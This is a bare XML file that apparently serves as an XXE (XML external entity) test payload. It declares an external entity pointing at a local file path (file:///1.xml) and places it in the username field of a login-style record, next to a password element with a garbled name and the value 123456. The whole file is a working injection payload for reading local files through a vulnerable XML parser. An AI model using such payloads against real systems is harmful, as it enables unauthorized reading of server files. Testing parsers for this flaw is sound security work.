<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lltest[
        <!ENTITY xxe SYSTEM "file:///1.xml">
        ]>
<user><username>&xxe;</username><pasdaasddsassword>123456</pasdaasddsassword></user>
